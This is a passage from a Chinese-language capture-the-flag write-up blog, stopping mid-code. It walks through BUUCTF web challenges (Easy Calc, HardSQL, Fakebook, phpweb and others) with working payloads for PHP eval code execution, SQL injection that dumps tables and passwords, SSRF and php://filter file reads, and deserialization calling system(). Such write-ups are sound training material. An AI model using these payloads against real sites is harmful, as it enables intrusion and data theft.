    <span class="token keyword">return</span> username<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>先注册：ᴬᴰᴹᴵᴺ，再改密码，再用ADMIN登录</p>
<blockquote>
<p>在注册的时候 ”ᴬᴰᴹᴵᴺ“ 经过strlower()，转成”ADMIN“ ， 在修改密码的时候 ”ADMIN“经过strlower()变成”admin“ , 当我们再次退出登录的时候 ”admin“经过strlower()变成”admin“</p>
</blockquote>
<hr>
<h3 id="RoarCTF-2019-Easy-Calc"><a href="#RoarCTF-2019-Easy-Calc" class="headerlink" title="[RoarCTF 2019]Easy Calc"></a>[RoarCTF 2019]Easy Calc</h3><blockquote>
<p>在默认情况下，正则表达式中的锚点 <code>^</code> 和 <code>$</code> 分别匹配整个字符串的开头和结尾。而当使用 <code>/m</code> 修饰符开启多行模式后，<code>^</code> 和 <code>$</code> 的匹配规则会发生变化：</p>
<ul>
<li><code>^</code> 可以匹配每行的开头（换行符 <code>\n</code> 之后的位置）。</li>
<li><code>$</code> 可以匹配每行的结尾（换行符 <code>\n</code> 之前的位置）。</li>
</ul>
</blockquote>
<pre class="line-numbers language-php" data-language="php"><code class="language-php">$<span class="token punctuation">(</span><span class="token string single-quoted-string">'#calc'</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token function">submit</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
<span class="token comment"># $('#calc')：使用 jQuery 选择器选中 id 为 calc 的表单元素。</span>
<span class="token comment">#.submit()：为选中的表单元素绑定提交事件处理函数。当表单被提交时，会执行该函数内的代码。</span>
        $<span class="token operator">.</span><span class="token function">ajax</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
            url<span class="token punctuation">:</span><span class="token string double-quoted-string">"calc.php?num="</span><span class="token operator">+</span><span class="token function">encodeURIComponent</span><span class="token punctuation">(</span>$<span class="token punctuation">(</span><span class="token string double-quoted-string">"#content"</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token function">val</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
            <span class="token argument-name">type</span><span class="token punctuation">:</span><span class="token string single-quoted-string">'GET'</span><span class="token punctuation">,</span>
            <span class="token argument-name">success</span><span class="token punctuation">:</span><span class="token keyword">function</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">{</span>
                $<span class="token punctuation">(</span><span class="token string double-quoted-string">"#result"</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token function">html</span><span class="token punctuation">(</span><span class="token string backtick-quoted-string">`&lt;div class="alert alert-success"&gt;
            &lt;strong&gt;答案:&lt;/strong&gt;${data}
            &lt;/div&gt;`</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span><span class="token punctuation">,</span>
            <span class="token argument-name">error</span><span class="token punctuation">:</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
                <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"这啥?算不来!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
                 <span class="token punctuation">}</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>
    <span class="token comment">#return false;：阻止表单的默认提交行为，即阻止页面刷新并跳转到表单的 action 属性指定的 URL。</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span>

 《<span class="token operator">?</span>php
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
        <span class="token variable">$str</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">#将num值赋给变量 $str</span>
        <span class="token variable">$blacklist</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">' '</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'\t'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'\r'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'\n'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'\''</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'"'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'`'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'\['</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'\]'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'\$'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'\\'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'\^'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$blacklist</span> <span class="token keyword">as</span> <span class="token variable">$blackitem</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/'</span> <span class="token operator">.</span> <span class="token variable">$blackitem</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'/m'</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"what are you want to do?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'echo '</span><span class="token operator">.</span><span class="token variable">$str</span><span class="token operator">.</span><span class="token string single-quoted-string">';'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">#eval，危险.（很贴心地给了分号？不用加了</span>
<span class="token punctuation">}</span>
<span class="token delimiter important">?&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>试了试输入只能输数字和其他一些字符。。。</p>
<blockquote>
<p>PHP需要将所有参数转换为有效的变量名，因此在解析查询字符串时，它会做两件事：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token number">1.</span>删除前后的空白符（空格符，制表符，换行符等统称为空白符）
<span class="token number">2.</span>将某些字符转换为下划线（包括空格）
   <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> 空白字符
    空白字符包括空格（）、制表符（\t）、换行符（\n）、回车符（\r）等。
   <span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>标点符号和特殊符号
    像常见的标点符号（如逗号 <span class="token punctuation">,</span>、句号 <span class="token operator">.</span>、问号 <span class="token operator">?</span>、感叹号 <span class="token operator">!</span> 等）以及其他特殊符号（如 @、<span class="token comment">#、$、%、^、&amp;、*、(、)、-、+、=、[、]、{、}、|、\、/ 等）都会被转换。</span>
   <span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>控制字符
例如 <span class="token constant">ASCII</span> 码值在 <span class="token number">0</span> <span class="token operator">-</span> <span class="token number">31</span> 之间的字符（如空字符 \<span class="token number">0</span>、换页符 \f 等）也会被转换。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote>
<p><strong>所以用空白字符可以偷梁换柱，绕过waf（%20num）却还是传一样的参数(num)。。。好阴险（</strong></p>
<p>试了试<code>?%20num=1;phpinfo()</code>可，但其他空白符就没那么幸运了（</p>
<p>用system发现不行（啊？</p>
<p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/04980deee4ee102d6c2eab0ad6d2d30b.png"></p>
<p><del>好好好</del></p>
<p>“ /被ban了（</p>
<p>说来也巧，刚在必做的rce中碰到<code>var_dump(scandir(chr(47)));读取根目录</code>（黑幕</p>
<p> var_dump()函数显示关于一个或多个表达式的结构信息，包括表达式的类型与值。</p>
<p>为啥这里头不用加双引号？</p>
<blockquote>
<pre class="line-numbers language-none"><code class="language-none">chr(47)` 本身就会返回一个字符串 `"/"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></blockquote>
<p>char还有这妙用（</p>
<pre class="line-numbers language-none"><code class="language-none">?%20num=1;var_dump(scandir(chr(47)))
 
string(5) "f1agg"<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<blockquote>
<p>通过 <code>.</code> 运算符把这些由 <code>chr()</code> 函数生成的字符连接起来</p>
</blockquote>
<p>想绕过\必须用chr(),-&gt;”/flagg”,cat啥的用不了了，得用个带括号的</p>
<p>掏出小本本（</p>
<pre class="line-numbers language-none"><code class="language-none">file_get_contents、highlight_file() ，show_source()

?%20num=1;var_dump(show_source(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>是在/flagg下，<del>第一次忘加chr(47)了</del></p>
<hr>
<h3 id="极客大挑战-2019-Http"><a href="#极客大挑战-2019-Http" class="headerlink" title="[极客大挑战 2019]Http"></a>[极客大挑战 2019]Http</h3><p>看见蓝色氛围</p>
<p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/ba7e5d6f4653e6e5d3db349a940b7c6f.png"></p>
<p><code>href="Secret.php"&gt;</code></p>
<p><code>It doesn't come from 'https://Sycsecret.buuoj.cn'</code></p>
<blockquote>
<p>网站管理员可以通过分析 <code>Referer</code> 字段来了解用户是从哪些外部网站或者页面进入到自己网站的。该字段记录了当前请求是从哪个页面链接过来的，也就是请求的来源页面的 URL。</p>
</blockquote>
<p>好吧，加上（</p>
<p><code>Please use "Syclover" browser</code></p>
<blockquote>
<p><code>User-Agent</code> 是客户端（如浏览器、移动应用等）在向服务器发送 HTTP 请求时，附带在请求头中的一个字符串，用于标识客户端软件的类型、版本以及运行环境等信息。</p>
</blockquote>
<p>好吧，再加上（</p>
<p><code>No!!! you can only read this locally!!!</code></p>
<p><del>（流汗黄豆</del></p>
<blockquote>
<p>X-Forwarded-For在使用代理服务器的场景下，该字段用于记录客户端的真实 IP 地址。</p>
</blockquote>
<p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/ed4c8498fb8fa85dd9e96fdb351ff69b.png"></p>
<hr>
<h3 id="极客大挑战-2019-EasySQL1-1"><a href="#极客大挑战-2019-EasySQL1-1" class="headerlink" title="[极客大挑战 2019]EasySQL1"></a>[极客大挑战 2019]EasySQL1</h3><p><img src="https://pick.lwzheng.tech/2024/12/18/6762547f9722a.png" alt="dfb8a353c0093c82c669db8e48864047.png"><br>单引号围的<br><img src="https://pick.lwzheng.tech/2024/12/18/6762547ec1f87.png" alt="37dcb4e8076a072d3478e3ee63d26e0d.png"><br>SQL的语法格式规定–和后面的注释内容必须间隔一个空格<br>在SQL注入中，“–+”可用于注释是因为在SQL语法里，“– ”（后面有空格）是标准的单行注释起始标识，“+”在这里可能是为了绕过某些过滤机制。当数据库执行SQL语句时，遇到“– ”就会忽略后面的内容，攻击者利用这个特性，通过构造包含“–+”的恶意语句，使后面的查询逻辑被注释掉，从而达到改变查询原意、获取非法数据等目的。<br>所以一定要有空格啊（</p>
<hr>
<h3 id="强网杯-2019-随便注1-1"><a href="#强网杯-2019-随便注1-1" class="headerlink" title="[强网杯 2019]随便注1"></a>[强网杯 2019]随便注1</h3><p><img src="https://pick.lwzheng.tech/2024/12/18/676254f13ad0c.png" alt="0a223de355e17decc72863de26a72b52.png"><br><img src="https://pick.lwzheng.tech/2024/12/18/676254f188ae2.png" alt="5a777138a26db07c378cadba24a77570.png"><br><img src="https://pick.lwzheng.tech/2024/12/18/676254f251310.png" alt="215b05e5165b0a292062e36954c398b1.png"><br><img src="https://pick.lwzheng.tech/2024/12/18/676254f31481b.png" alt="236c845da78aa517ba031f0b2b554f48.png"><br><img src="https://pick.lwzheng.tech/2024/12/18/676254f6c7017.png" alt="98d0595f1c0374397a3d1370b7306369.png"><br><img src="https://pick.lwzheng.tech/2024/12/18/676254f77a903.png" alt="2f6ceaccb29373f6fdf89f7a6b651bdb.png"><br><img src="https://pick.lwzheng.tech/2024/12/18/6762c639590d8.png" alt="5dbad5fe33b7be4a387406654588dc4a.png"><br><a href="https://">https://www.mysqlzh.com/doc/126/253.html</a></p>
<pre class="line-numbers language-none"><code class="language-none">1';
handler `1919810931114514` open;
handler `1919810931114514` read first;#<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>这道题我好像被剧透了（，本来想打开小本本翻一翻堆叠（因为我越看越熟悉，好像要用这个），结果发现堆叠就是从这道题抄的（<br><img src="https://pick.lwzheng.tech/2024/12/18/6762763fcad8d.png" alt="2ee162ea82c68b0b28b3ac8f6996d071.png"></p>
<pre class="line-numbers language-none"><code class="language-none">1';handler `1919810931114514` open as`ddl`;
handler `ddl` read next;--
一样<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<hr>
<h3 id="极客大挑战-2019-HardSQL1-1"><a href="#极客大挑战-2019-HardSQL1-1" class="headerlink" title="[极客大挑战 2019]HardSQL1"></a>[极客大挑战 2019]HardSQL1</h3><p>先放个字典<br><a href="https://">https://www.cnblogs.com/CVE-Lemon/p/16187971.html</a><br><img src="https://pick.lwzheng.tech/2024/12/18/6762554c94cf7.png" alt="afdd780a3c26cc0291a0ff2edfbf27c5.png"><br>/**/,%20，=都被过滤了，但like没被过滤换=;and也被搞了，用or（burp可见，反正过滤了一堆，就不放图了<br><img src="https://pick.lwzheng.tech/2024/12/18/6762554811cd5.png" alt="75d480ea766c77feff663a8247a6ac96.png"><br>limit没被过滤，说明是空格被过滤了<br><img src="https://pick.lwzheng.tech/2024/12/18/67625547539f8.png" alt="30e79d19bae056941cd635f627db1854.png"><br>查一个新的<br><img src="https://pick.lwzheng.tech/2024/12/18/676255467d276.png" alt="1c7660abc9397a5f09c54c68feadd623.png"><br>%A0不可<br><img src="https://pick.lwzheng.tech/2024/12/18/676255458d8b4.png" alt="0ef86a801db09c991dc813e96465423a.png"><br><img src="https://pick.lwzheng.tech/2024/12/18/67625544864a8.png" alt="dd6be0eecab7f9fbb43422f88041b2e7.png"><br>（）可，尝试了下可为<code>1'or(1)like(1)#</code>，万能密码成功后发现只有这个，用报错注入<br><img src="https://pick.lwzheng.tech/2024/12/18/67627335bef31.png" alt="15b57d9a0152f4a97cf94568454d8e96.png"><br>我用我的那个报错注入的方法发现一直不对，然后发现是rand被过滤了。<del>好好好，三种方法选了一种就正好被过滤了</del><br><img src="https://pick.lwzheng.tech/2024/12/18/676255439ec72.png" alt="467fa8d31cd839e3b1d0cc4f10819f9e.png"><br>那就换个<br>[<a target="_blank" rel="noopener" href="https://www.cnblogs.com/csyxf/p/10241456.html]">https://www.cnblogs.com/csyxf/p/10241456.html]</a>(https://）extractvalue无事，遂用<br><img src="https://pick.lwzheng.tech/2024/12/18/67625542b93af.png" alt="91bf424956abef30cb47ef6c4db7022f.png"><br>这里我发现直接用hackbar传不对，然后在登录界面重新尝试了一下，并观察上方网址，发现需要用URL编码后再execute<br><del>（可能是因为过滤的太多了吧，太屑了</del><br><code>1'or(extractvalue(0x7e,concat(0x7e,(select(database())))))#</code><br><img src="https://pick.lwzheng.tech/2024/12/18/67626e7fde819.png" alt="3fa376449c53c54edcb9227885473a8a.png"><br><code>1'or(extractvalue(0x7e,concat(0x7e(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like('geek')))))#</code><br><img src="https://pick.lwzheng.tech/2024/12/18/67626e787aefc.png" alt="894a4b1c6d1a51c1fd51954ac75dde7d.png"><br><code>1'or(extractvalue(0x7e,concat(0x7e(select(group_concat(column_name))from(information_schema.columns)where(table_name)like('H4rDsq1')))))#</code><br><img src="https://pick.lwzheng.tech/2024/12/18/67626e78ef348.png" alt="77d4fac4a64b308ec7f3098ee092cf1e.png"><br><code>1'or(extractvalue(0x7e,concat(0x7e,(select(group_concat(password))from(geek.H4rDsq1)))))#</code><br><img src="https://pick.lwzheng.tech/2024/12/18/67626e79b2b08.png" alt="85556fa19c74c093ea33a47a536d314e.png"><br>然后发现substr被过滤了（悲<br><img src="https://pick.lwzheng.tech/2024/12/18/67626e7ab2063.png" alt="ab4c261fdcca91d8108362ae777a8491.png"><br>遂再找（<br><a href="https://">https://www.wanfa688.com/html/Products/478771.html</a><br>试了一下left和right都挺安全的<br><img src="https://pick.lwzheng.tech/2024/12/18/67626e80aed15.png" alt="3f3cf8afbbb43a3fa4b255b6a7080e0f.png"><br><code>1'or(extractvalue(0x7e,concat(0x7e,right((select(group_concat(password))from(geek.H4rDsq1)),31))))#</code><br><img src="https://pick.lwzheng.tech/2024/12/18/67626e81e2af4.png" alt="398dde33f15ac6556d2337bf694af22f.png"><br>拼一下<br><code>flag{589e7b10-f37f-4255-84d3-a323ae257d5b}</code></p>
<hr>
<p><del>话说sqlmap能不能再多出一些脚本什么的，不够用哇</del><br><del>等我复习完cpp一定高产似那啥咕咕咕咕</del></p>
<p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/2589138a0ce77cd759f201600a1de079.png"></p>
<p>第二页</p>
<h3 id="RoarCTF-2019-Easy-Java"><a href="#RoarCTF-2019-Easy-Java" class="headerlink" title="[RoarCTF 2019]Easy Java"></a>[RoarCTF 2019]Easy Java</h3><p><img src="https://pick.lwzheng.tech/2025/01/30/679b8f9e2f284.png" alt="2aa097d60db4614df1889feb73c9e37a.png"><br>Are you sure the flag is here? ? ?<br>=&gt;需用post</p>
<blockquote>
<p>java+WEB-INF是java的WEB应用的安全目录<br>WEB-INF主要包含一下文件或目录:<br>/WEB-INF/web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。<br>/WEB-INF/classes/：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中<br>/WEB-INF/lib/：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件<br>/WEB-INF/src/：源码目录，按照包名结构放置各个java文件。<br>/WEB-INF/database.properties：数据库配置文件<br>漏洞检测以及利用方法：通过找到web.xml文件，推断class文件的路径，最后直接class文件，在通过反编译class文件，得到网站源码</p>
</blockquote>
<p>/WEB-INF/web.xml+post=&gt;com.wm.ctf.FlagController<br><img src="https://pick.lwzheng.tech/2025/01/30/679b915b78a65.png" alt="d8258a6166b96cdf02779b7bf957ed0f.png"><br> servlet class+加上classes来访问来访问class文件目录，且文件后缀为.class<br><code>Download?filename=/WEB-INF/classes/com/wm/ctf/FlagController.class</code></p>
<pre class="line-numbers language-none"><code class="language-none">ZmxhZ3tkNjMxYzVlYi1iOTJmLTQ0MTYtODVkOC1kMDE5Y2NkZmQ5YWZ9Cg==
flag{d631c5eb-b92f-4416-85d8-d019ccdfd9af}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<hr>
<h3 id="网鼎杯-2018-Fakebook"><a href="#网鼎杯-2018-Fakebook" class="headerlink" title="[网鼎杯 2018]Fakebook"></a>[网鼎杯 2018]Fakebook</h3><p>扫：/robots.txt，下user.php.bak；flag.php</p>
<pre class="line-numbers language-none"><code class="language-none">function get($url)
  {
      $ch = curl_init();

      curl_setopt($ch, CURLOPT_URL, $url);
      curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
      $output = curl_exec($ch);
      $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
      if($httpCode == 404) {
          return 404;
      }
      curl_close($ch);#curl ssrf

      return $output;
  }<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>注册一个，在no后sql注入，过滤了一些。</p>
<pre class="line-numbers language-none"><code class="language-none">?no=1 order by 4有4列
?no=-1 union/**/select database(),database(),database(),database()#，2处有个fakebook
?no=-1 union/**/select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema='fakebook'# users
?no=-1 union/**/select 1,group_concat(column_name),3,4 from information_schema.columns where table_name='users'#  no,username,passwd,data,USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS  
?no=-1 union/**/select 1,group_concat(data),3,4 from fakebook.users#
O:8:"UserInfo":3:{s:4:"name";s:0:"";s:3:"age";i:0;s:4:"blog";s:40:"https://github.com/lingqing777/watchlist";},O:8:"UserInfo":3:{s:4:"name";s:4:"qing";s:3:"age";i:18;s:4:"blog";s:40:"https://github.com/lingqing777/watchlist";}
//对ba起我注册了两遍（<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>blog用反序列化<br><code>?no=-1 union/**/select 1,2,3,'O:8:"UserInfo":3:{s:4:"name";s:0:"";s:3:"age";i:0;s:4:"blog";s:40:"https://github.com/lingqing777/watchlist";}'</code><br><img src="https://pick.lwzheng.tech/2025/02/02/679f241756457.png" alt="9e1ee8b50ef827975e8b9efb8eebd3c7.png"><br>看了一下，是源码<br>很多方法都不行去flag.php<br><img src="https://pick.lwzheng.tech/2025/02/02/679f2416d6fdf.png" alt="be4161b71b3e861bd50da4cc32df4f2b.png"><br>看来在web目录下，file://访问本地文件系统<br><code>?no=-1 union/**/select 1,2,3,'O:8:"UserInfo":3:{s:4:"name";s:0:"";s:3:"age";i:0;s:4:"blog";s:29:"file:///var/www/html/flag.php";}'</code></p>
<p><code>PD9waHANCg0KJGZsYWcgPSAiZmxhZ3swYzg1MWNmNS0zZGU3LTQ4ZDItYTA5Yi02OWQxZDY2ZWRiODN9IjsNCmV4aXQoMCk7DQo=</code><br><code>flag{0c851cf5-3de7-48d2-a09b-69d1d66edb83}</code></p>
<hr>
<p>load_file()函数可以利用绝对路径去加载一个文件<br><code>?no=-1 union/**/select 1,load_file("/var/www/html/flag.php"),3,4--+</code><br><img src="https://pick.lwzheng.tech/2025/02/02/679f26e361949.png" alt="f57ca8e4259259d03fb661b7dc8a8566.png"></p>
<hr>
<h3 id="BSidesCF-2020-Had-a-bad-day"><a href="#BSidesCF-2020-Had-a-bad-day" class="headerlink" title="[BSidesCF 2020]Had a bad day"></a>[BSidesCF 2020]Had a bad day</h3><p>扫出flag.php<br><img src="https://pick.lwzheng.tech/2025/02/02/679f284a61f7b.png" alt="5b963d116ac7f02965c9aced93849dee.png"><br>这张很有王霸之气<br>?category=php://filter/read.convert.base64-encode/resource=index.php<br>Failed opening ‘php://filter/read.convert.base64-encode/resource=index.php.php<br>?category=php://filter/read.convert.base64-encode/resource=index<br>?category=php://filter/read.convert.base64-encode/resource=flag不行<br>看了github发现原来可以酱<br>?category=php://filter/convert.base64-encode/write=woofers/resource=flag</p>
<hr>
<h3 id="网鼎杯-2020-朱雀组-phpweb"><a href="#网鼎杯-2020-朱雀组-phpweb" class="headerlink" title="[网鼎杯 2020 朱雀组]phpweb"></a>[网鼎杯 2020 朱雀组]phpweb</h3><p>能不能少放些可怕的图真的很吓人。。。</p>
<blockquote>
<p>func=date&amp;p=Y-m-d+h%3Ai%3As+a<br>date() 函数p 应该是 date() 函数所需的格式参数。<br>%3A 是 URL 编码后的冒号 :，所以 h%3Ai%3As 实际就是 h:i:s。</p>
<ul>
<li>在 URL 里通常表示空格，这里可当作空格看待。（ai</li>
</ul>
</blockquote>
<p><code>function 'base64' not found or invalid function name in</code><br>那就再找找,试了试serialize行，system被过滤了。</p>
<blockquote>
<p>file_get_contents、highlight_file() ，show_source()</p>
</blockquote>
<p><img src="https://pick.lwzheng.tech/2025/02/02/679f54f631e71.png" alt="87bd2fdb103c30c69844228612a6f76d.png"><br><code>func=highlight_file&amp;p=index.php</code></p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php">《<span class="token operator">?</span>php

<span class="token keyword">class</span> <span class="token class-name-definition class-name">Test</span><span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token variable">$p</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"ls /"</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$func</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"system"</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">public</span> <span class="token variable">$p</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'find / -name "*flag*"'</span><span class="token punctuation">;</span> 
<span class="token constant">O</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"Test"</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"p"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">21</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"find / -name "</span><span class="token operator">*</span>flag<span class="token operator">*</span><span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"func"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"system"</span><span class="token punctuation">;</span><span class="token punctuation">}</span>
 <span class="token keyword">public</span> <span class="token variable">$p</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'cat /tmp/flagoefiu4r93'</span><span class="token punctuation">;</span>（挺无语的试出来的<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>或php内的” \ “在做代码执行的时候，会识别特殊字符串，绕过黑名单<br><code>func=\system&amp;p=cat /tmp/flagoefiu4r93</code></p>
<hr>
<h3 id="BJDCTF2020-ZJCTF，不过如此"><a href="#BJDCTF2020-ZJCTF，不过如此" class="headerlink" title="[BJDCTF2020]ZJCTF，不过如此"></a>[BJDCTF2020]ZJCTF，不过如此</h3><p><a target="_blank" rel="noopener" href="http://02d70d0c-b20c-4763-9f00-ddc3d9ba7b1a.node5.buuoj.cn:81/?text=php://input&amp;file=php://filter/read=convert.base64-encode/resource=next.php.........I">http://02d70d0c-b20c-4763-9f00-ddc3d9ba7b1a.node5.buuoj.cn:81/?text=php://input&amp;file=php://filter/read=convert.base64-encode/resource=next.php.........I</a> have a dream……<br><img src="https://pick.lwzheng.tech/2025/02/02/679f620a14e68.png" alt="154b514c66b309cfe4aae38adf72a224.png"></p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php">《<span class="token operator">?</span><span class="token class-name type-declaration">php</span>
<span class="token variable">$id</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$id</span><span class="token punctuation">;</span>

<span class="token keyword">function</span> <span class="token function-definition function">complex</span><span class="token punctuation">(</span><span class="token variable">$re</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">return</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span>
        <span class="token string single-quoted-string">'/('</span> <span class="token operator">.</span> <span class="token variable">$re</span> <span class="token operator">.</span> <span class="token string single-quoted-string">')/ei'</span><span class="token punctuation">,</span>
        <span class="token string single-quoted-string">'strtolower("\\1")'</span><span class="token punctuation">,</span>
        <span class="token variable">$str</span>
    <span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>


<span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$_GET</span> <span class="token keyword">as</span> <span class="token variable">$re</span> <span class="token operator">=&gt;</span> <span class="token variable">$str</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment">#动态赋值的过程，即会将get请求中的参数名作为键$re，参数对应的值作为键值$str</span>
    <span class="token keyword">echo</span> <span class="token function">complex</span><span class="token punctuation">(</span><span class="token variable">$re</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token operator">.</span> <span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

